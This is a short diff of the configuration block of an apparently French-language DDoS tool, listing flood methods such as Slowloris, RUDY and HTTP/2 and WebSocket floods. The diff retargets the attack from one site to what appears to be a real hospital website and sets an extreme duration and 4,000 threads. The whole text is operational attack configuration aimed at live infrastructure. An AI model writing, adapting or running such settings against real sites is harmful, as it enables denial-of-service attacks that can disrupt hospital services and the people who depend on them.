@@ -29,7 +29,7 @@ METHOD = 7              # Méthode d'attaque (1 à 10) :
                         # 4=Slowloris          9=Layer7 HTTP/2
                         # 5=RUDY              10=WebSocket Flood
 
-TARGET = "https://senpai-stream.baby/"   # Cible : IP ou URL (ex: "192.168.1.1" ou "http://example.com")
+TARGET = "https://www.chu-rouen.fr/"   # Cible : IP ou URL (ex: "192.168.1.1" ou "http://example.com")
 PORT = 80                       # Port (utilisé pour méthodes 1,2,4,5,6)
 DURATION = 6000000                   # Durée en secondes
 THREADS = 4000                   # Nombre de threads / concurrence
